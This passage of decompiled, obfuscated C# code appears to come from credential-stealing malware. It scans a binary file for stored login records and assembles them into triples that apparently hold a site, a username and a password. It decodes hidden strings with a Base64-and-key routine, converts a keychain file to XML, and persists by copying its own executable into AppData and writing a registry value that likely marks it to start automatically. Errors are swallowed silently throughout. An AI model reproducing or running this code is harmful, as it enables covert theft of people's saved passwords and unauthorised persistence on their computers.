				byte[] array = File.ReadAllBytes(Class10.Class11.string_0);
				int num = 0;
				int num2 = array.Length - 5;
				for (int i = 0; i <= num2; i++)
				{
					if (array[i] == 0 && array[i + 1] == 0 && array[i + 2] == 0 && array[i + 3] == 8)
					{
						num = array[i + 15];
						byte[] array2 = new byte[8];
						byte[] array3 = new byte[num - 1 + 1];
						Array.Copy(array, i + 4, array2, 0, array2.Length);
						Array.Copy(array, i + 16, array3, 0, array3.Length);
						Class10.Class11.string_1 = Class10.Class11.string_1 + Class16.smethod_23(array2, array3) + Environment.NewLine;
						i += 11 + num;
					}
				}
				Class10.Class11.string_8 = Class10.Class11.string_1.Split(new char[1] { Conversions.ToChar(Environment.NewLine) });
				int num3 = 0;
				do
				{
					Class10.Class11.string_8[num3] = null;
					num3++;
				}
				while (num3 <= 3);
				int num4 = Class10.Class11.string_8.Length - 1;
				for (int j = 0; j <= num4; j++)
				{
					Class10.Class11.string_2 = null;
					Class10.Class11.string_3 = null;
					Class10.Class11.string_4 = null;
					Class10.Class11.int_0 = 0;
					if (!Class10.Class11.string_8[j].Contains(Class16.smethod_57("rtXg4591kAI=", "False")) && !Class10.Class11.string_8[j].Contains(Class16.smethod_57("kbjDxrtjc34g", "False")) && !Class10.Class11.string_8[j].Contains(Class16.smethod_57("lb7Fln1eGA==", "False")))
					{
						if (Class10.Class11.bool_1)
						{
							if (j - Class10.Class11.int_3 == 1 || j - Class10.Class11.int_3 == 2)
							{
								int num5 = Class10.Class11.string_8[j].Length - 1;
								for (int k = 0; k <= num5; k++)
								{
									if (Class10.Class11.string_8[j][k - Class10.Class11.int_0] > '\u007f')
									{
										Class10.Class11.string_8[j] = Class10.Class11.string_8[j].Remove(k - Class10.Class11.int_0, 1);
										Class10.Class11.int_0++;
									}
								}
								if (j - Class10.Class11.int_3 == 1)
								{
									Class10.Class11.string_3 = Class10.Class11.string_8[j];
								}
								else if (j - Class10.Class11.int_3 == 2)
								{
									Class10.Class11.string_4 = Class10.Class11.string_8[j];
									Class10.Class11.int_1++;
									Class10.Class11.bool_1 = false;
								}
							}
						}
						else if (Class10.Class11.int_3 != 0 && (j == Class10.Class11.int_3 + 2 || j == Class10.Class11.int_3 + 4))
						{
							int num6 = Class10.Class11.string_8[j].Length - 1;
							for (int l = 0; l <= num6; l++)
							{
								if (Class10.Class11.string_8[j][l - Class10.Class11.int_0] > '\u007f')
								{
									Class10.Class11.string_8[j] = Class10.Class11.string_8[j].Remove(l - Class10.Class11.int_0, 1);
									Class10.Class11.int_0++;
								}
							}
							if (j == Class10.Class11.int_3 + 2)
							{
								Class10.Class11.string_3 = Class10.Class11.string_8[j];
							}
							else if (j == Class10.Class11.int_3 + 4)
							{
								Class10.Class11.string_4 = Class10.Class11.string_8[j];
								Class10.Class11.int_1++;
							}
						}
					}
					else if (j != 0)
					{
						int num7 = Class10.Class11.string_8[j].Length - 1;
						for (int m = 0; m <= num7; m++)
						{
							if (Class10.Class11.string_8[j][m - Class10.Class11.int_0] > '\u007f')
							{
								Class10.Class11.string_8[j] = Class10.Class11.string_8[j].Remove(m - Class10.Class11.int_0, 1);
								Class10.Class11.int_0++;
							}
						}
						if (j - Class10.Class11.int_3 == 1)
						{
							Class10.Class11.string_2 = Class10.Class11.string_8[j];
						}
						else if (j - Class10.Class11.int_3 == 2)
						{
							Class10.Class11.string_2 = Class10.Class11.string_8[j];
						}
						if (Class10.Class11.string_8[j].Contains(Class16.smethod_57("lb7Fln1eGA==", "False")))
						{
							Class10.Class11.string_2 = Class10.Class11.string_8[j];
						}
						Class10.Class11.int_3 = j;
					}
					if (Operators.CompareString(Class10.Class11.string_2, (string)null, false) != 0)
					{
						Class10.Class11.string_5[Class10.Class11.int_1] = Class10.Class11.string_2;
					}
					if (Operators.CompareString(Class10.Class11.string_3, (string)null, false) != 0)
					{
						Class10.Class11.string_6[Class10.Class11.int_1] = Class10.Class11.string_3;
					}
					if (Operators.CompareString(Class10.Class11.string_4, (string)null, false) != 0)
					{
						Class10.Class11.string_7[Class10.Class11.int_1 - 1] = Class10.Class11.string_4;
					}
				}
				int num8 = Class10.Class11.string_5.Length - 1;
				for (int n = 0; n <= num8 && Operators.CompareString(Class10.Class11.string_5[n], "", false) != 0; n++)
				{
					Class10.Class11.string_9[Class10.Class11.int_2] = Class10.Class11.string_5[n];
					Class10.Class11.string_9[Class10.Class11.int_2 + 1] = Class10.Class11.string_6[n];
					Class10.Class11.string_9[Class10.Class11.int_2 + 2] = Class10.Class11.string_7[n];
					Class10.Class11.int_2 += 3;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	static int smethod_49(Class23.Class25 class25_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class25_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class25_0.uint_0;
			class25_0.uint_0 >>= 8;
			class25_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class25_0.int_1 - class25_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class25_0.byte_0, class25_0.int_0, byte_0, int_0, int_1);
		class25_0.int_0 += int_1;
		if (((uint)(class25_0.int_0 - class25_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class25_0.uint_0 = class25_0.byte_0[class25_0.int_0++] & 0xFFu;
			class25_0.int_2 = 8;
		}
		return num + int_1;
	}

	static void smethod_50(Class23.Class25 class25_0, int int_0)
	{
		class25_0.uint_0 >>= int_0;
		class25_0.int_2 -= int_0;
	}

	static string smethod_51(int int_0, int int_1)
	{
		if (int_0 >= Class8.struct3_0.Length)
		{
			return null;
		}
		if (int_1 >= Class8.struct3_0[int_0].string_0.Length)
		{
			return null;
		}
		return Class8.struct3_0[int_0].string_0[int_1];
	}

	static string smethod_52()
	{
		string result = default(string);
		try
		{
			if (File.Exists(Class10.Class11.string_0 + Class16.smethod_57("hZO/u7qKoJ7GrZulq82pl6h9uqmdHg==", "False")))
			{
				Class10.Class11.string_0 += Class16.smethod_57("coCsqKd3jYuzmoiSmLqWhJVqp5aKMQ==", "False");
				Class16.smethod_48();
				return result;
			}
			if (File.Exists(Class10.Class11.string_0 + Class16.smethod_57("f425tbSEmpjAp5WfpcC0kqSyvKd/taq+plGiqsQn", "False")))
			{
				Class10.Class11.string_0 += Class16.smethod_57("jZvHw8KSqKbOtaOts87CoLLAyrWNw7jMtF+wuNIZ", "False");
				Class16.smethod_48();
				return result;
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static void smethod_53(Class12.Class13 class13_0)
	{
		try
		{
			Class12.Class13.Struct7[] array = Class16.smethod_1();
			Class5.string_10 = Class16.smethod_57("eZSfpph5lJ+mmHmUn6aYeZSfpph5lJ+mmHmUn6aYj7jIys2ld67YwqXF1aaYeZSfpph5lJ+mmHmUn6aYeZSfpph5lJ+mmHmUnw0=", "False");
			Class12.Class13.Struct7[] array2 = array;
			for (int i = 0; i < array2.Length; i = checked(i + 1))
			{
				Class12.Class13.Struct7 @struct = array2[i];
				Class5.string_10 = Class5.string_10 + Environment.NewLine + Class16.smethod_57("icK/08GVvL+bcxI=", "False") + @struct.string_0;
				Class5.string_10 = Class5.string_10 + Environment.NewLine + Class16.smethod_57("aJSxuK6HpaJ/Vy4=", "False") + @struct.string_2 + Environment.NewLine;
			}
			Class5.string_10 = Class5.string_10 + Environment.NewLine + Class16.smethod_57("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpAg=", "False");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_54(int int_0, Class23.Class24 class24_0, int int_1, byte[] byte_0)
	{
		int num = 0;
		do
		{
			if (class24_0.int_4 != 11)
			{
				int num2 = Class16.smethod_40(int_1, int_0, class24_0.class26_0, byte_0);
				int_0 += num2;
				num += num2;
				int_1 -= num2;
				if (int_1 == 0)
				{
					return num;
				}
			}
		}
		while (Class16.smethod_7(class24_0) || (class24_0.class26_0.int_1 > 0 && class24_0.int_4 != 11));
		return num;
	}

	static bool smethod_55(ref IntPtr intptr_0, IntPtr intptr_1, ref Class12.Class13.Struct6 struct6_0, int int_0, string string_0, ref Class12.Class13.Struct6 struct6_1, ref Class12.Class13.Struct6 struct6_2)
	{
		return false;
	}

	static int smethod_56(int int_0)
	{
		if (int_0 > Class8.byte_0.Length)
		{
			return 0;
		}
		checked
		{
			int num = int_0 + 8;
			int num2 = int_0;
			while (true)
			{
				if (num2 <= num)
				{
					if (num2 <= Class8.byte_0.Length - 1)
					{
						if ((Class8.byte_0[num2] & 0x80) != 128)
						{
							break;
						}
						num2++;
						continue;
					}
					return 0;
				}
				return int_0 + 8;
			}
			return num2;
		}
	}

	static string smethod_57(string string_0, string string_1)
	{
		string @string = default(string);
		try
		{
			@string = Encoding.UTF8.GetString(Class16.smethod_21(Convert.FromBase64String(string_0), Encoding.UTF8.GetBytes(string_1)));
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	static void smethod_58(Class22 class22_0)
	{
		class22_0.type_0.GetMethod("Clear")!.Invoke(class22_0.object_0, new object[0]);
	}

	static bool smethod_59(ref string string_0, string string_1, string string_2)
	{
		bool result = default(bool);
		try
		{
			string_0 = null;
			if (!File.Exists(string_2))
			{
				result = false;
				return result;
			}
			Process process = new Process();
			process.StartInfo.FileName = string_2;
			process.StartInfo.Arguments = " -convert xml1 -s -o \"" + Class12.Class13.smethod_0(ref string_0, Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\fixed_keychain.xml\" ") + "\"" + string_1 + "\"";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.Start();
			process.WaitForExit();
			result = process.StandardOutput.ReadToEnd().Length == 0;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static int smethod_60(Class23.Class27 class27_0, Class23.Class25 class25_0)
	{
		int num;
		int num2;
		if ((num = Class16.smethod_63(class25_0, 9)) >= 0)
		{
			if ((num2 = class27_0.short_0[num]) >= 0)
			{
				Class16.smethod_50(class25_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class16.smethod_63(class25_0, int_)) >= 0)
			{
				num2 = class27_0.short_0[num3 | (num >> 9)];
				Class16.smethod_50(class25_0, num2 & 0xF);
				return num2 >> 4;
			}
			int int_2 = class25_0.int_2;
			num = Class16.smethod_63(class25_0, int_2);
			num2 = class27_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= int_2)
			{
				Class16.smethod_50(class25_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int int_3 = class25_0.int_2;
		num = Class16.smethod_63(class25_0, int_3);
		num2 = class27_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= int_3)
		{
			Class16.smethod_50(class25_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static int smethod_61()
	{
		return Class8.struct3_0.Length;
	}

	static void smethod_62()
	{
		int num = 0;
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False")))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False"), overwrite: true);
			}
		}
		catch (Exception ex)
		{
			int num2 = default(int);
			ProjectData.SetProjectError(ex, num2);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			int num2 = 1;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class16.smethod_57("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), writable: true);
				registryKey.SetValue(Class14.Class15.string_0, Class14.Class15.string_1);
				registryKey.Close();
				Thread.Sleep(5000);
				try
				{
					Class5.thread_3.Abort();
					break;
				}
				catch (Exception ex2)
				{
					ProjectData.SetProjectError(ex2, num2);
					ProjectData.ClearProjectError();
					break;
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3, num2);
				if (num == 3)
				{
					try
					{
						Class5.thread_3.Abort();
					}
					catch (Exception ex4)
					{
						ProjectData.SetProjectError(ex4, num2);
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
					break;
				}
				num = checked(num + 1);
				ProjectData.ClearProjectError();
			}
		}
	}

	static int smethod_63(Class23.Class25 class25_0, int int_0)
	{
		if (class25_0.int_2 < int_0)
		{
			if (class25_0.int_0 == class25_0.int_1)
			{
				return -1;
			}
			class25_0.uint_0 |= (uint)(((class25_0.byte_0[class25_0.int_0++] & 0xFF) | ((class25_0.byte_0[class25_0.int_0++] & 0xFF) << 8)) << class25_0.int_2);
			class25_0.int_2 += 16;
		}
		return (int)(class25_0.uint_0 & ((1 << int_0) - 1));
	}
}
